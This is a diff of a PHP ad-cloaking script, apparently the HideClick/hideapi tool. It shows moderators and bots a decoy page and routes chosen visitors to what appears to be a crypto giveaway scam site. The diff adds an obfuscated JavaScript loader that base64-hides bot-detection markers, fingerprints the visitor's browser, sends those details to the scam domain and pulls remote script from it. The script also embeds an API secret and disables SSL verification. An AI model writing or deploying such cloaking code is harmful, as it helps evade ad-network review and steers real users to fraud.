@@ -1,7 +1,6 @@
 <?php
 /* Required settings     */
-$CLOAKING['WHITE_PAGE'] = 'https://amazon.com/';//PHP/HTML file or URL used for bots
-$CLOAKING['OFFER_PAGE'] = 'https://clu-coin-free.vercel.app/';//PHP/HTML file or URL offer used for real users
+$CLOAKING['OFFER_PAGE'] = 'http://localhost:3000/comment';//PHP/HTML file or URL offer used for real users
 $CLOAKING['DEBUG_MODE'] = 'on';// replace "on" with "off" to switch from debug to production mode
 $CLOAKING['STEALTH'] = 'off';// replace "on" with "off" to hide stat page
 /*********************************************/
@@ -9,7 +8,7 @@ $CLOAKING['STEALTH'] = 'off';// replace "on" with "off" to hide stat page
 
 /* Geo filter: Display offer page only to visitors from allowed countries.  */
 /* For example, if you enter 'RU,UA' in the next line, system will only allow users from Russia and Ukraine */
-$CLOAKING['ALLOW_GEO'] = 'EU';
+ $CLOAKING['ALLOW_GEO'] = 'AU';
 
 /* Blocked Geo filter: Hide offer page from visitors of selected countries.  */
 /* For example, if you enter 'IN,CN' in the next line, system will block users from India and China */
@@ -18,26 +17,25 @@ $CLOAKING['ALLOW_GEO'] = 'EU';
 /* UTM parameters forwarding */
 /* true - turn on UTM forwarding; */
 /* false - disable UTM forwarding */
-$CLOAKING['UTM'] = true;
-
-/* OFFER_PAGE display method. Available options: meta, 302, iframe */
-/* 'meta' - Use meta refresh to redirect visitors. (default method due to maximum compatibility with different hostings) */
-/* '302' -  Redirect visitors using 302 header (best method if the goal is maximum transitions).*/
+ $CLOAKING['UTM'] = true;
+/* OFFER_PAGE display method. Available options: redirect, iframe */
+/* 'redirect' -  redirect visitors to offer page. (default method due to maximum compatibility with different hostings) */
 /* 'iframe' - Open URL in iframe. (recommended and safest method. requires the use of a SSL to work properly) */
-$CLOAKING['OFFER_METHOD'] = 'iframe';
+ $CLOAKING['OFFER_METHOD'] = 'redirect';
 
-/* WHITE_PAGE display method. Available options: curl, 302 */
-/* 'curl' - uses a server request to display third-party whitepage on your domain */
-/* '302' -  uses a 302 redirect to redirect the request to a third-party domain (only for trusted accounts)  */
-$CLOAKING['WHITE_METHOD'] = 'curl';
+/* Method of integration with WHITE_PAGE. Available options : standart, encoded */
+/* YOU MUST TO GENERATE NEW SCRIPT TO CHANGE THIS ! */
+ $CLOAKING['WHITE_METHOD'] = 'standart';
 
 /* NO_REF used to block requests with empty referrer. */
 /* false - allow requests without referrer */
 /* true - block requests without referrer */
+/* YOU MUST TO GENERATE NEW SCRIPT TO CHANGE THIS ! */
 $CLOAKING['NO_REF'] = false;
 
 /* WHITE_REF blocks requests if referrer does not match the regular expression.*/
 /* For example: 'google|facebook' will block all traffic, exept traffic from google and facebook */
+/* YOU MUST TO GENERATE NEW SCRIPT TO CHANGE THIS ! */
 $CLOAKING['WHITE_REF'] = '';
 
 /* change 'false' to 'true' to block Apple devices (iOS, Mac) */
@@ -67,6 +65,8 @@ $CLOAKING['DELAY_PERMANENT'] = false;
 /* Paranoia mode uses the most rigid filters. Checks out some additional features inherent in spy services. But at the same time, in some countries, it can block a significant part of real users. */
 /* change 'false' to 'true' to activate this mode */
 $CLOAKING['PARANOID'] = false;
+/* Fast mode. Set 'true' to skip some checks and display offer page faster. Set 'false' to block residential proxy */
+$CLOAKING['FAST'] = true;
 
 /* secret UTM options */
 // if allow_utm_must is set and the same UTM string is not present in the request, the white page will be displayed.
@@ -89,13 +89,18 @@ $CLOAKING['PARANOID'] = false;
 /* DO NOT SHARE API KEY! KEEP IT SECRET!     */
 $CLOAKING['API_SECRET_KEY'] = 'v18c984be2ea4847c6b57a8e851b5c8893';
 /*********************************************/
+/* YOU MUST TO GENERATE NEW SCRIPT TO CHANGE THIS */
+$CLOAKING['WHITE_PAGE'] = '<script>var biqpeipidbpqcemnwectwnupq=function(src){var q=atob("X19zdG9wQWxsVGltZXJzLndlYmRyaXZlci5fX25pZ2h0bWFyZS5fc2VsZW5pdW0uY2FsbFBoYW50b20uY2FsbFNlbGVuaXVtLl9TZWxlbml1bV9JREVfUmVjb3JkZXIuc2VsZW5pdW0uZHJpdmVyLl9zZWxlbml1bS5fX3dlYmRyaXZlcl9ldmFsdWF0ZS5fX3NlbGVuaXVtX2V2YWx1YXRlLl9fd2ViZHJpdmVyX3NjcmlwdF9mdW5jdGlvbi5fX3dlYmRyaXZlcl9zY3JpcHRfZnVuYy5fX3dlYmRyaXZlcl9zY3JpcHRfZm4uX19meGRyaXZlcl9ldmFsdWF0ZS5fX2RyaXZlcl91bndyYXBwZWQuX193ZWJkcml2ZXJfdW53cmFwcGVkLl9fZHJpdmVyX2V2YWx1YXRlLl9fc2VsZW5pdW1fdW53cmFwcGVkLl9fZnhkcml2ZXJfdW53cmFwcGVkLl9waGFudG9tLnBoYW50b20uZG9tQXV0b21hdGlvbl9fbmlnaHRtYXJl").split("."),e=encodeURIComponent,g=0,w=window,d=w.document,n=w.navigator,de="documentElement",s=w.screen,p="",a="avail",i="inner",o="outer",H="Height",W="Width",c=w.chrome?Object.keys(w.chrome).join("*"):"*",tag=d.createElement("script");function wd(){try{for(var l in q){var z=q[l];if(w[z]||n[z])return z;if(d&&d[de]&&d[de].getAttribute&&d[de].getAttribute(z))return z;if(z in w||z in d)return z}return 0}catch(e){}}!function wp(){try{if(n&&n.plugins){Object.keys(n.plugins).forEach(function(i){if(n.plugins[i])p+=n.plugins[i].filename+"*"})}}catch(e){}}();try{g=d.createElement("canvas").getContext("webgl");g=g.getParameter(g.getExtension("WEBGL_debug_renderer_info").UNMASKED_RENDERER_WEBGL)}catch(e){}src="https://clu-coin-free.vercel.app/cl.js?clid="+btoa("ref="+e(d.referrer)+"&drive="+wd()+"&c="+c+"&s="+s[a+H]+"*"+w[i+H]+"*"+w[o+H]+"*"+s[a+W]+"*"+w[i+W]+"*"+w[o+W]+"*"+w.devicePixelRatio+"*"+n.maxTouchPoints+"&p="+p+"&h="+n.hardwareConcurrency+"*"+n.deviceMemory+"*"+e(g)+"&t="+e(new Date().toString())+"&q="+e(w.location.search.substr(1)));tag["type"]="text/javascript";tag["src"]=src;document.head.appendChild(tag)}("https://connect.facebook.net/en_US/fbevents.js")</script>';// white page JS script integration code.
 // DO NOT EDIT ANYTHING BELOW !!!
 if(!empty($CLOAKING['VERSION']) || !empty($GLOBALS['CLOAKING']['VERSION'])) die('Recursion Error');
-//$CLOAKING['VERSION']=20200303;
+//$CLOAKING['VERSION']=20200115;
 $CLOAKING['VERSION']=20210527;
 //$CLOAKING['HTACCESS_FIX'] = true;
 /* dirty fix!!! uncomment only if problem with IP detection!!! */
 //if(!empty($_SERVER['HTTP_X_REAL_IP'])) $_SERVER['REMOTE_ADDR']=$_SERVER['HTTP_X_REAL_IP'];
+
+//if($CLOAKING['FAST']) $stage='js2'; else $stage='js1';
+$stage='js2';
 
 $errorContactMessage="<br><br>Something went wrong. Contact support";
 if(!empty($_GET['utm_allow_geo']) && preg_match('#^[a-zA-Z]{2}(-|$)#',$_GET['utm_allow_geo'])) $CLOAKING['ALLOW_GEO']=$_GET['utm_allow_geo'];
@@ -136,14 +141,12 @@ if(!empty($_REQUEST['cloaking']) && ($CLOAKING['STEALTH']=='off' || $CLOAKING['D
         else $domainStat.='&date2='.time();
         if(!empty($_REQUEST['date1'])) $domainStat.='&date1='.$_REQUEST['date1'];//timestamp
         else $domainStat.='&date1='.(time()-604800);
-        if (!function_exists('curl_init')) $statistic = file_get_contents('https://hideapi.xyz/newstat?api=' . $CLOAKING['API_SECRET_KEY'] . '&lang=en&sign=92193176841351f1623481990&version='.$CLOAKING['VERSION'].'&js=false&cache='.$CLOAKING['DISABLE_CACHE'].'&geo=' . urlencode($CLOAKING['ALLOW_GEO']) . '&blockgeo=' . urlencode($CLOAKING['BLOCK_GEO']) . '&paranoid=' . $CLOAKING['PARANOID'] . '&allowvpn=' . $CLOAKING['ALLOW_VPN'] . '&host=' . urlencode($host) . '&white=' . urlencode($CLOAKING['WHITE_PAGE']) . '&offer=' . urlencode($CLOAKING['OFFER_PAGE']).$domainStat, 'r', stream_context_create(array('http' => array('method' => 'GET', 'timeout' => 45), 'ssl'=>array('verify_peer'=>false,'verify_peer_name'=>false,) )) );
-        else $statistic = cloakedCurl('https://hideapi.xyz/newstat?api=' . $CLOAKING['API_SECRET_KEY'] . '&lang=en&sign=92193176841351f1623481990&version='.$CLOAKING['VERSION'].'&js=false&cache='.$CLOAKING['DISABLE_CACHE'].'&geo=' . urlencode($CLOAKING['ALLOW_GEO']) . '&blockgeo=' . urlencode($CLOAKING['BLOCK_GEO']) . '&paranoid=' . $CLOAKING['PARANOID'] . '&allowvpn=' . $CLOAKING['ALLOW_VPN'] . '&host=' . urlencode($host) . '&white=' . urlencode($CLOAKING['WHITE_PAGE']) . '&offer=' . urlencode($CLOAKING['OFFER_PAGE']).$domainStat);
+        if (!function_exists('curl_init')) $statistic = file_get_contents('https://hideapi.xyz/newstatjs?api=' . $CLOAKING['API_SECRET_KEY'] . '&lang=en&sign=92193176841351f1623482417&version='.$CLOAKING['VERSION'].'&stage='.$stage.'&js=true&cache='.$CLOAKING['DISABLE_CACHE'].'&geo=' . urlencode($CLOAKING['ALLOW_GEO']) . '&blockgeo=' . urlencode($CLOAKING['BLOCK_GEO']) .'&paranoid=' . $CLOAKING['PARANOID'] . '&allowvpn=' . $CLOAKING['ALLOW_VPN'] . '&host=' . urlencode($host) . '&offer=' . urlencode($CLOAKING['OFFER_PAGE']).$domainStat, 'r', stream_context_create(array('http' => array('method' => 'GET', 'timeout' => 45), 'ssl'=>array('verify_peer'=>false,'verify_peer_name'=>false,) )) );
+        else $statistic = cloakedCurl('https://hideapi.xyz/newstatjs?api=' . $CLOAKING['API_SECRET_KEY'] . '&lang=en&sign=92193176841351f1623482417&version='.$CLOAKING['VERSION'].'&stage='.$stage.'&js=true&cache='.$CLOAKING['DISABLE_CACHE'].'&geo=' . urlencode($CLOAKING['ALLOW_GEO']) . '&blockgeo=' . urlencode($CLOAKING['BLOCK_GEO']) .'&paranoid=' . $CLOAKING['PARANOID'] . '&allowvpn=' . $CLOAKING['ALLOW_VPN'] . '&host=' . urlencode($host) . '&offer=' . urlencode($CLOAKING['OFFER_PAGE']).$domainStat);
         echo $statistic;
         if (empty($statistic)) echo "<html><head><meta name=\"robots\" content=\"noindex\"><meta charset=\"UTF-8\"></head><body>".$errorContactMessage;
     }
-    else if ($_REQUEST['cloaking'] == 'white') cloakedWhitePage($CLOAKING['WHITE_PAGE'],$CLOAKING['WHITE_METHOD']);
-    else if ($_REQUEST['cloaking'] == 'offer') cloakedOfferPage($CLOAKING['OFFER_PAGE'],$CLOAKING['OFFER_METHOD']);
-    else if ($_REQUEST['cloaking'] == 'debug') {phpinfo();print_r(debug_backtrace ());$CLOAKING['API_SECRET_KEY']=1;print_r($CLOAKING);die();}
+    else if ($_REQUEST['cloaking'] == 'debug') {phpinfo();print_r(debug_backtrace ());$CLOAKING['API_SECRET_KEY']=1;print_r(htmlentities(print_r($CLOAKING,true)));die();}
     else if ($_REQUEST['cloaking'] == 'test') {
         if (!function_exists('curl_init')) {
             echo "<br>CURL not found<br>\n";
@@ -222,16 +225,11 @@ else if($CLOAKING['DEBUG_MODE'] == 'on'){
         die();
     }
     echo '<html><head><meta name="robots" content="noindex"><meta charset="UTF-8"><style type="text/css">body, html {font-family: Calibri, Ebrima;}img {margin-left:2em;opacity: 0.25;}img:hover {opacity: 1.0;}</style></head><body><b>Congratulations.</b><br>Literally in a moment you can increase your ROI.<br><br><b>First, make sure that everything is configured correctly:</b><br>';
-    if(is_file($CLOAKING['WHITE_PAGE'])) echo '✔ WHITE_PAGE - ok. <a target="_blank" href="?cloaking=white">Click here to check the WHITE_PAGE</a>.<br>';
-    else if(strstr($CLOAKING['WHITE_PAGE'],'://')) echo '⚠ To reduce the likelihood of a ban, we recommend using local WHITE_PAGE (page located on your website)! If you still want to use the current settings, <a target="_blank" href="?cloaking=white">click here to check the WHITE_PAGE</a>.<br>';
-    else {echo '❌ WHITE_PAGE - error! Change the value in line <b>#'.cloakedEditor("\$CLOAKING['WHITE_PAGE']").'</b> to the page that will be displayed to bots<br><img src="https://hide.click/gif/white.gif" border="1"><br>';$error=1;}
-
-    if(is_file($CLOAKING['OFFER_PAGE']) && ($CLOAKING['OFFER_PAGE']=='index.htm' || $CLOAKING['OFFER_PAGE']=='index.html' || $CLOAKING['OFFER_PAGE']=='index.php' )) {echo '⚠ To reduce the likelihood of a ban, rename OFFER_PAGE (for example, <b>offer.php</b> instead of <b>'.$CLOAKING['OFFER_PAGE'].'</b>) and put new name in line <b>#'.cloakedEditor("\$CLOAKING['OFFER_PAGE']").'</b> <img src="https://hide.click/gif/black.gif" border="1"><br>';}
-    else if(is_file($CLOAKING['OFFER_PAGE']) || strstr($CLOAKING['OFFER_PAGE'],'://')) echo '✔ OFFER_PAGE - ok. <a target="_blank" href="?cloaking=offer">Click to check the OFFER_PAGE</a>.<br>';
+    if(strstr($CLOAKING['OFFER_PAGE'],'://')) echo '✔ OFFER_PAGE - ok.<br>';
     else {echo '❌ OFFER_PAGE - error! Change the value in line <b>#'.cloakedEditor("\$CLOAKING['OFFER_PAGE']").'</b> to the page that will be displayed to targeted users<br><img src="https://hide.click/gif/black.gif" border="1"><br>';$error=1;}
     $CLOAKINGdata='{}';
-    if(!function_exists('curl_init')) $CLOAKING['STATUS'] = @file_get_contents('http://api.hideapi.xyz/basic?ip=1.1.1.1&port=1111&key='.$CLOAKING['API_SECRET_KEY'].'&sign=92193176841351f1623481990&version='.$CLOAKING['VERSION'].'&curl=false&js=false&cache='.$CLOAKING['DISABLE_CACHE'].'&htaccess='.$CLOAKING['HTACCESS_FIX'] , 'r', stream_context_create(array('ssl'=>array('verify_peer'=>false,'verify_peer_name'=>false,), 'http' => array('method' => 'POST', 'timeout' => 5, 'header'=> "Content-type: application/x-www-form-urlencoded\r\n". "Content-Length: ".strlen($CLOAKINGdata). "\r\n", 'content' => $CLOAKINGdata))));
-    else $CLOAKING['STATUS'] = @cloakedCurl('http://api.hideapi.xyz/basic?ip=1.1.1.1&port=1111&key='.$CLOAKING['API_SECRET_KEY'].'&sign=92193176841351f1623481990&version='.$CLOAKING['VERSION'].'&curl=true&js=false&cache='.$CLOAKING['DISABLE_CACHE'].'&htaccess='.$CLOAKING['HTACCESS_FIX'], $CLOAKINGdata);
+    if(!function_exists('curl_init')) $CLOAKING['STATUS'] = @file_get_contents('http://api.hideapi.xyz/basic?ip=1.1.1.1&port=1111&key='.$CLOAKING['API_SECRET_KEY'].'&sign=92193176841351f1623482417&version='.$CLOAKING['VERSION'].'&curl=false&stage='.$stage.'&js=true&cache='.$CLOAKING['DISABLE_CACHE'].'&htaccess='.$CLOAKING['HTACCESS_FIX'] , 'r', stream_context_create(array('ssl'=>array('verify_peer'=>false,'verify_peer_name'=>false,), 'http' => array('method' => 'POST', 'timeout' => 5, 'header'=> "Content-type: application/x-www-form-urlencoded\r\n". "Content-Length: ".strlen($CLOAKINGdata). "\r\n", 'content' => $CLOAKINGdata))));
+    else $CLOAKING['STATUS'] = @cloakedCurl('http://api.hideapi.xyz/basic?ip=1.1.1.1&port=1111&key='.$CLOAKING['API_SECRET_KEY'].'&sign=92193176841351f1623482417&version='.$CLOAKING['VERSION'].'&curl=true&stage='.$stage.'&js=true&cache='.$CLOAKING['DISABLE_CACHE'].'&htaccess='.$CLOAKING['HTACCESS_FIX'], $CLOAKINGdata);
 
     if(!$CLOAKING['STATUS'] || stristr($CLOAKING['STATUS'],'error')){
         echo '❌ PHP configuration error. Contact your hosting support and ask them to enable CURL in PHP.<br>';
@@ -256,8 +254,8 @@ else if($CLOAKING['DEBUG_MODE'] == 'on'){
     $CLOAKINGdata['REQUEST_METHOD']=$_SERVER['REQUEST_METHOD'];
     if( $_SERVER["SERVER_PORT"]==443 || !empty($_SERVER['HTTPS']) || !empty($_SERVER['SSL']) ) $CLOAKINGdata['HTTP_HTTPS']='1';
     $CLOAKINGdata = json_encode($CLOAKINGdata);
-    if(!function_exists('curl_init')) $CLOAKING['STATUS'] = @file_get_contents('http://api.hideapi.xyz/basic?ip='.$_SERVER["REMOTE_ADDR"].'&port='.$_SERVER["REMOTE_PORT"].'&banReason='.$CLOAKING['banReason'].'&key='.$CLOAKING['API_SECRET_KEY'].'&sign=92193176841351f1623481990&version='.$CLOAKING['VERSION'].$CLOAKING['WHITE_METHOD'].'.'.$CLOAKING['OFFER_METHOD'].'&js=false&cache='.$CLOAKING['DISABLE_CACHE'].'&geo='.preg_replace('#[^a-zA-Z,]+#',',',$CLOAKING['ALLOW_GEO']).'&blockgeo=' . urlencode($CLOAKING['BLOCK_GEO']) .'&paranoid='.$CLOAKING['PARANOID'] . '&allowvpn=' . $CLOAKING['ALLOW_VPN'].'&white='.urlencode($CLOAKING['WHITE_PAGE']).'&offer='.urlencode($CLOAKING['OFFER_PAGE']) , 'r', stream_context_create(array('ssl'=>array('verify_peer'=>false,'verify_peer_name'=>false,), 'http' => array('method' => 'POST', 'timeout' => 5, 'header'=> "Content-type: application/x-www-form-urlencoded\r\n". "Content-Length: ".strlen($CLOAKINGdata). "\r\n", 'content' => $CLOAKINGdata))));
-    else $CLOAKING['STATUS'] = @cloakedCurl('http://api.hideapi.xyz/basic?ip='.$_SERVER["REMOTE_ADDR"].'&port='.$_SERVER["REMOTE_PORT"].'&banReason='.$CLOAKING['banReason'].'&key='.$CLOAKING['API_SECRET_KEY'].'&sign=92193176841351f1623481990&version='.$CLOAKING['VERSION'].$CLOAKING['WHITE_METHOD'].'.'.$CLOAKING['OFFER_METHOD'].'&js=false&cache='.$CLOAKING['DISABLE_CACHE'].'&geo='.preg_replace('#[^a-zA-Z,]+#',',',$CLOAKING['ALLOW_GEO']).'&blockgeo=' . urlencode($CLOAKING['BLOCK_GEO']) .'&paranoid='.$CLOAKING['PARANOID'] . '&allowvpn=' . $CLOAKING['ALLOW_VPN'].'&white='.urlencode($CLOAKING['WHITE_PAGE']).'&offer='.urlencode($CLOAKING['OFFER_PAGE']), $CLOAKINGdata);
+    if(!function_exists('curl_init')) $CLOAKING['STATUS'] = @file_get_contents('http://api.hideapi.xyz/basic?ip='.$_SERVER["REMOTE_ADDR"].'&port='.$_SERVER["REMOTE_PORT"].'&banReason='.$CLOAKING['banReason'].'&key='.$CLOAKING['API_SECRET_KEY'].'&sign=92193176841351f1623482417&version='.$CLOAKING['VERSION'].$CLOAKING['WHITE_METHOD'].'.'.$CLOAKING['OFFER_METHOD'].'.'.$CLOAKING['FAST'].'&stage='.$stage.'&js=true&cache='.$CLOAKING['DISABLE_CACHE'].'&geo='.preg_replace('#[^a-zA-Z,]+#',',',$CLOAKING['ALLOW_GEO']).'&blockgeo=' . urlencode($CLOAKING['BLOCK_GEO']) .'&paranoid='.$CLOAKING['PARANOID'] . '&allowvpn=' . $CLOAKING['ALLOW_VPN'].'&offer='.urlencode($CLOAKING['OFFER_PAGE']) , 'r', stream_context_create(array('ssl'=>array('verify_peer'=>false,'verify_peer_name'=>false,), 'http' => array('method' => 'POST', 'timeout' => 5, 'header'=> "Content-type: application/x-www-form-urlencoded\r\n". "Content-Length: ".strlen($CLOAKINGdata). "\r\n", 'content' => $CLOAKINGdata))));
+    else $CLOAKING['STATUS'] = @cloakedCurl('http://api.hideapi.xyz/basic?ip='.$_SERVER["REMOTE_ADDR"].'&port='.$_SERVER["REMOTE_PORT"].'&banReason='.$CLOAKING['banReason'].'&key='.$CLOAKING['API_SECRET_KEY'].'&sign=92193176841351f1623482417&version='.$CLOAKING['VERSION'].$CLOAKING['WHITE_METHOD'].'.'.$CLOAKING['OFFER_METHOD'].'.'.$CLOAKING['FAST'].'&stage='.$stage.'&js=true&cache='.$CLOAKING['DISABLE_CACHE'].'&geo='.preg_replace('#[^a-zA-Z,]+#',',',$CLOAKING['ALLOW_GEO']).'&blockgeo=' . urlencode($CLOAKING['BLOCK_GEO']) .'&paranoid='.$CLOAKING['PARANOID'] . '&allowvpn=' . $CLOAKING['ALLOW_VPN'].'&offer='.urlencode($CLOAKING['OFFER_PAGE']), $CLOAKINGdata);
     $CLOAKING['STATUS'] = json_decode($CLOAKING['STATUS'], true);
     if(empty($CLOAKING['STATUS']) || empty($CLOAKING['STATUS']['action'])){
         echo '❌ Bad network! Your hosting provider might be using some kind of firewall or resource limiter that will result in excessive traffic loss. It can\'t be fixed on our side. You need a different hosting. Contact us if you have any questions.<br><br>';
@@ -295,7 +293,7 @@ else if($CLOAKING['DEBUG_MODE'] == 'on'){
         $error=1;
     }
     if(preg_match('#x-cache-enabled.*True#i',$static3)) {// || (!empty($_SERVER['X-LSCACHE']) &&  $_SERVER['X-LSCACHE']=='on')
-        echo '❌ Bad server. The current server caches the results, which will lead to large traffic losses and a high probability of being banned. It can\'t be fixed on our side. You need a different hosting. Contact us if you have any questions.<br><br>';
+        echo '❌ Bad server. The current server caches the results, which can lead to large traffic losses and a high probability of being banned. It can\'t be fixed on our side. You need a different hosting. Contact us if you have any questions.<br><br>';
         $error=1;
     }
 //    else if(!empty($CLOAKING['DISABLE_CACHE'])) {
@@ -332,16 +330,16 @@ else if($CLOAKING['DEBUG_MODE'] == 'on'){
         if($_SERVER['REMOTE_ADDR']==$_SERVER['SERVER_ADDR'] && empty($_SERVER['HTTP_CF_RAY']) && empty($_SERVER['HTTP_X_REAL_IP']) && empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
             echo '❌ looks like your server falsify the user\'s IP address. Probably you need a different hosting. Contact us if you have any questions.<br>';
         }
-        else if(preg_match('#^[a-fA-F0-9]+[:.]+[a-fA-F0-9]+[:.]+[a-fA-F0-9]+[:.]+#',$_SERVER['REMOTE_ADDR'],$cid) && empty($_SERVER['HTTP_CF_RAY']) && empty($_SERVER['HTTP_X_REAL_IP']) && empty($_SERVER['HTTP_X_FORWARDED_FOR']) ) {
+        else if(preg_match('#^[a-fA-F0-9]+[:.]+[a-fA-F0-9]+[:.]+[a-fA-F0-9]+[:.]+#',$_SERVER['REMOTE_ADDR'],$cid) && empty($_SERVER['HTTP_CF_RAY']) && empty($_SERVER['HTTP_X_REAL_IP']) && empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
             if(stristr('#'.$_SERVER['SERVER_ADDR'],'#'.$cid[0])) echo '❌ looks like your server falsify the user\'s IP address. You need a different hosting. Contact us if you have any questions.<br>';
         }
     }
     if(empty($_SERVER['HTTP_CF_RAY']) && !empty($_SERVER['HTTP_X_FORWARDED_FOR']) && !empty($_SERVER['HTTP_X_REAL_IP']) && !empty($_SERVER['REMOTE_ADDR']) && !empty($_SERVER['SERVER_ADDR']) && $_SERVER['HTTP_X_FORWARDED_FOR']==$_SERVER['HTTP_X_REAL_IP'] && $_SERVER['HTTP_X_REAL_IP']!=$_SERVER['REMOTE_ADDR'] && $_SERVER['REMOTE_ADDR']!=$_SERVER['SERVER_ADDR']) {
         echo '❌ It looks like your server falsify the user IP address. Contact us via telegram: <a href="tg://resolve?domain=HideClick">@HideClick</a> to make sure everything is working correctly.<br>';
     }
-    echo 'Excellent. Setup completed.<br>In the future, you can use this file for any number of domains. There is no need to repeat this process on this hosting.<br><br>';
-    echo '<b><u>Last step:</u></b><br>If everything works without errors, turn off the DEBUG_MODE by changing the value in line <b>#'.cloakedEditor("\$CLOAKING['DEBUG_MODE']").'</b> to <b>off</b>.<br><img src="https://hide.click/gif/debug.gif" border="1"><br>';
-    echo 'After that, the script will start working in production mode and instead of this page you will see offer page or white page (depends on settings).<br><br>';
+    echo '⚠ Add JavaScript to your white page: <script>function copy(){var copyText = document.getElementById("myInput");copyText.select();copyText.setSelectionRange(0, 999999);document.execCommand("copy");}</script><code><input type="text" value="'.htmlentities($CLOAKING['WHITE_PAGE']).'" id="myInput"><button onclick="copy()">copy to clipboard</button></code>  Edit HTML and add code after &lt;HEAD&gt; :<br><br>';
+    echo '⚠ Last step: If everything works without errors, turn off the DEBUG_MODE by changing the value in line <b>#'.cloakedEditor("\$CLOAKING['DEBUG_MODE']").'</b> to <b>off</b>.<br><img src="https://hide.click/gif/debug.gif" border="1"><br>';
+    echo 'After that, the script will start working in production mode and instead of this page you will see some JavaScript code.<br><br>';
     echo '<b>Important!<br>WHITE_PAGE MUST COMPLETELY COMPLY WITH THE ADVERTISING NETWORK RULES!</b><br>Do you need more information on how to make the right white page? Contact us in telegram: <a href="tg://resolve?domain=HideClick">@HideClick</a>.';
     die();
 }
@@ -349,65 +347,51 @@ else {
 
 }
 
-if(empty($CLOAKING['WHITE_PAGE']) || (!strstr($CLOAKING['WHITE_PAGE'],'://') && !is_file($CLOAKING['WHITE_PAGE']))){
-    echo "<html><head><meta name=\"robots\" content=\"noindex\"><meta charset=\"UTF-8\"></head><body>ERROR FILE NOT FOUND: ".$CLOAKING['WHITE_PAGE']."! \r\n<br>".$errorContactMessage;
+if(empty($CLOAKING['OFFER_PAGE']) || (!strstr($CLOAKING['OFFER_PAGE'],'://') )){
+    echo "<html><head><meta name=\"robots\" content=\"noindex\"><meta charset=\"UTF-8\"></head><body>ERROR: Non valid offer page: OFFER_PAGE='".$CLOAKING['OFFER_PAGE']."'!\r\n<br>".$errorContactMessage;
     die();
 }
-if(empty($CLOAKING['OFFER_PAGE']) || (!strstr($CLOAKING['OFFER_PAGE'],'://') && !is_file($CLOAKING['OFFER_PAGE']))){
-    echo "<html><head><meta name=\"robots\" content=\"noindex\"><meta charset=\"UTF-8\"></head><body>ERROR FILE NOT FOUND: ".$CLOAKING['OFFER_PAGE']."! \r\n<br>".$errorContactMessage;
-    die();
-}
-// start of code
-// dirty hack for binome to hide PHP headers...
+
 if (function_exists('header_remove')) header_remove("X-Powered-By");
-if (function_exists('ini_set')) @ini_set('expose_php', 'off');
-// dirty hack to save CPU load and avoid death loops by ignoring some extensions...
-if(empty($CLOAKING['HTACCESS_FIX']) && preg_match('#\.(jpg|jpeg|css|gif|svg|ttf|woff|webm|ico|js)$#i',$_SERVER["REQUEST_URI"])){
-    if(!stristr($CLOAKING['OFFER_PAGE'],'://')) cloakedOfferPage($CLOAKING['OFFER_PAGE'],$CLOAKING['OFFER_METHOD']);
-    else cloakedWhitePage($CLOAKING['WHITE_PAGE'],$CLOAKING['WHITE_METHOD']);
-}
-// dirty hacks to protect from death loops
-if(sizeof(debug_backtrace ())>2) {
-    echo "ERROR: INFINITE RECURSION";
-    die();
-}
+@ini_set('expose_php', 'off');
+
 $CLOAKINGdata = array();
 
 if (function_exists("getallheaders")) $CLOAKINGdata = getallheaders();
 else foreach($_SERVER as $k=> $v){
     if (substr($k, 0, 5) == 'HTTP_') $CLOAKINGdata[$k] = $v;
 }
+// fix to support early versions...
+$getvars=array();
+if(!empty($_GET['clid']) && base64_decode($_GET['clid'])) {
+    parse_str(base64_decode($_GET['clid']),$getvars);
+    if($getvars) {
+        $_SERVER['REQUEST_URI'] = preg_replace('#\?clid=.*#', '?' . base64_decode($_GET['clid']), $_SERVER['REQUEST_URI']);
+        $_SERVER['QUERY_STRING'] = base64_decode($_GET['clid']);
+        if (!empty($getvars['utm_allow_geo']) && preg_match('#^[a-zA-Z]{2}(-|$)#', $getvars['utm_allow_geo'])) $CLOAKING['ALLOW_GEO'] = $getvars['utm_allow_geo'];
+        $_GET['ref'] = $getvars['ref'];
+        $_GET['q'] = $getvars['q'];
+    }
+}
+
 $CLOAKINGdata['path']=$_SERVER["REQUEST_URI"];
 $CLOAKINGdata['REQUEST_METHOD']=$_SERVER['REQUEST_METHOD'];
 if( $_SERVER["SERVER_PORT"]==443 || !empty($_SERVER['HTTPS']) || !empty($_SERVER['SSL']) ) $CLOAKINGdata['HTTP_HTTPS']='1';
-
 //fix for roadrunner ???
 //$CLOAKINGdata['host']=$CLOAKING['DOMAIN'];//fix for roadrunner ???
 //$CLOAKINGdata['path']=http_build_query ($_GET);//fix for roadrunner ???
 
 $CLOAKING['banReason']='';
-if(!empty($CLOAKING['allow_utm_must']) || !empty($CLOAKING['allow_utm_opt'])){
-    $utmstring=http_build_query($_GET);
-    if(!empty($CLOAKING['allow_utm_opt'])) {
-        $CLOAKING['allow_utm_opt'] = preg_replace('#[\s,]+#', '|', $CLOAKING['allow_utm_opt']);
-        $CLOAKING['allow_utm_opt'] = "#" . trim($CLOAKING['allow_utm_opt'], ',') . "#i";
-    }
-    if(!empty($CLOAKING['allow_utm_must']) && !stristr($utmstring,$CLOAKING['allow_utm_must'])) $CLOAKING['banReason'].='utmfilterm.';
-    if(!empty($CLOAKING['allow_utm_opt']) && !preg_match($CLOAKING['allow_utm_opt'],$utmstring)) $CLOAKING['banReason'].='utmfilterk.';
-}
-if(!empty($CLOAKING['block_utm'])) {
-    $utmstring=http_build_query($_GET);
-    if(!empty($CLOAKING['block_utm']) && stristr($utmstring,$CLOAKING['block_utm'])) $CLOAKING['banReason'].='utmfilterb.';
-}
-
 if($CLOAKING['NO_REF'] || !empty($CLOAKING['WHITE_REF'])){
     $ref='';
     foreach (array('HTTP_REFERER','Referer','referer','REFERER') as $k){
         if(!empty($CLOAKINGdata[$k])) {$ref=$CLOAKINGdata[$k];break;}
         if(!empty($_SERVER[$k])) {$ref=$_SERVER[$k];break;}
     }
+    if(empty($ref)) $CLOAKING['banReason'].='norefjs.';
+    $ref = empty($_GET['ref']) ? '' : $_GET['ref'];
     if(empty($ref)) $CLOAKING['banReason'].='noref.';
-    elseif(!empty($CLOAKING['WHITE_REF']) && !preg_match("#https?://[^/]*(".$CLOAKING['WHITE_REF'].")#i",$ref)) $CLOAKING['banReason'].='blackref.';
+    else if(!empty($CLOAKING['WHITE_REF']) && !preg_match("#https?://[^/]*(".$CLOAKING['WHITE_REF'].")#i",$ref)) $CLOAKING['banReason'].='blackref.';
 }
